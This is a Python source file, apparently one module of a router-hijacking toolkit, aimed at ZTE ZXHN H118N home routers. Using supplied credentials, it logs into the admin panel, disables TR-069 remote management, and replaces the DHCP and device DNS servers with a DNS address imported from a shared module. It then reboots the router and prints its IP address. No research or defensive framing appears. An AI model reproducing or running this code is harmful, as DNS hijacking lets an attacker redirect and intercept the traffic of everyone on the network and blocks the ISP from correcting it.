import re

import requests

from shared import DNS
from shared import parse
from shared import TIMEOUT


def zte_H118N(full_string):
    try:
        ip, username, password = parse(full_string)
    except ValueError:
        return False

    s = requests.Session()

    try:
        r = s.get(f'http://{ip}', timeout=TIMEOUT)
        r.raise_for_status()
        if 'ZXHN H118N' not in r.text:
            return False
        login_token = re.findall(r'getObj\("Frm_Logintoken"\).value = "(\d+)"', r.text)[0]
    except (requests.RequestException, IndexError):
        return False

    r = s.post(f'http://{ip}/', {
        'action': 'login',
        'Username': username,
        'Password': password,
        'Frm_Logintoken': login_token,
    }, timeout=TIMEOUT)
    try:
        r.raise_for_status()
    except requests.RequestException:
        return False
    if '/start.ghtml' not in r.url:
        return False

    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_tr069_basic_t.gch', {
        'Tr069Enable': '0',
        'IF_ACTION': 'apply',
        'IF_ERRORSTR': 'SUCC',
        'IF_ERRORPARAM': 'SUCC',
        'IF_ERRORTYPE': '-1',
    }, timeout=TIMEOUT).raise_for_status()
    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=net_dhcp_dynamic_t.gch', {
        'DNSServer1': DNS,
        'DNSServer2': '',
        'DNSServer3': '',
        'DnsServerSource': '0',
        'ISPDnsServerSource': 'NULL',
        'IF_ACTION': 'apply',
        'IF_ERRORSTR': 'SUCC',
        'IF_ERRORPARAM': 'SUCC',
        'IF_ERRORTYPE': '-1',
    }, timeout=TIMEOUT).raise_for_status()
    s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=app_dev_dns_t.gch', {
        'SerIPAddress1': DNS,
        'SerIPAddress2': '0.0.0.0',
        'IF_ACTION': 'apply',
        'IF_ERRORSTR': 'SUCC',
        'IF_ERRORPARAM': 'SUCC',
        'IF_ERRORTYPE': '-1',
    }, timeout=TIMEOUT).raise_for_status()

    try:
        s.post(f'http://{ip}/getpage.gch?pid=1002&nextpage=manager_dev_conf_t.gch', {
            'IF_ACTION': 'devrestart',
            'IF_ERRORSTR': 'SUCC',
            'IF_ERRORPARAM': 'SUCC',
            'IF_ERRORTYPE': '-1',
            'IF_PAGE': '',
            'flag': '1',
        }, timeout=TIMEOUT).raise_for_status()
    except requests.exceptions.ReadTimeout:
        pass

    print(ip)
    return True
